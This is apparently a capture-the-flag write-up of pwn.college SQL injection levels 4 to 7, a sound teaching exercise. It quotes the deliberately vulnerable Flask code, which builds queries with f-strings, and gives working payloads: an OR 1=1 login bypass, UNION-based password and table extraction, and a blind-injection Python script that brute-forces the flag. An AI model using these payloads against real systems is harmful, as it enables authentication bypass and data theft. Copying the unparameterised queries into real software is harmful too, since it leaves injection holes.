# SQL Injection Vulnerabilities

## Level 4 - SQL Injection

Code for this level:

```python
def level4():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

This time, the user is stored in a `session` so we can't send it. Instead, we want to exploit the fact that the `username` and `password` are used to form the SQL string for authenticating the user. I want to change it to something like this;

```sql
SELECT rowid, * FROM users WHERE username = "flag" AND password = "" OR 1=1 --"
```

To do this, I use `curl` to login,

```sh
curl -v -c cookies.dat --data "username=flag" --data "password=%22 OR 1=1 --" -X POST http://challenge.localhost:80
```

Then I pull the session cookie out and follow the redirect,

```sh
curl -v -b session=eyJ1c2VyIjoxfQ.ZnCLHA.yyxgmZ5gotlukXOhlRf99GfV4RU http://challenge.localhost:80
```

## Level 5 - SQL injection using UNION

The code for this level,

```python
def level5():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM users WHERE username LIKE "{query}"').fetchall()
    return "".join(f'{user["username"]}\n' for user in users)
```

In this case, I want to take advantage of the `query` parameter to create a SQL statement,

```sql
SELECT username FROM users WHERE username LIKE "" UNION SELECT password FROM users --"
```

I form this in `curl`,

```sh
curl -v http://challenge.localhost:80?query=%22%20UNION%20SELECT%20password%20FROM%20users%20--
```

## Level 6 - SQL injection with an unknown schema

```python
def level6():
    table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"
    db.execute((f"CREATE TABLE IF NOT EXISTS {table_name} AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
    return "".join(f'{user["username"]}\n' for user in users)
```

Once again, use a UNION but this time to list tables, `SELECT name FROM sqlite_master`,

```sh
curl -v http://challenge.localhost:80?query=%22%20UNION%20SELECT%20name%20FROM%20sqlite_master%20--
```

This gives me the table name `table13213357520839709907` which I can use like in level 5,

```sh
curl -v http://challenge.localhost:80?query=%22%20UNION%20SELECT%20password%20FROM%20table13213357520839709907%20--
```

## Level 7 - Blind SQL injection

In a blind SQL injection, you must infer the data based on side effects in the web application. In this case, I create a SQL Injection attack that looks for passwords like `pwn.college{%`. If I can log in, the password that I have so far is correct, if I can't, then it is incorrect. I can then loop through all the possible characters to find each character in the password.

```python
#!/usr/bin/env python3

import requests
import json

flag = 'pwn.college{'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

while True:
    # Loop from space to tilde ~
    for c in range(32, 127):
        # skip * and ? from the glob
        if c == 42 or c == 63:
            continue

        char = chr(c)

        data = {
            'username': 'flag',
            'password': f"\" OR password GLOB '{flag}{char}*' --"
        }
        r = requests.post('http://challenge.localhost:80', headers=headers, data=data)

        # Check the response
        if r.status_code == 200:
            flag += char
            print(flag)
            break

    if flag[-1] == '}':
        break

print("Pwn'd the flag")
```
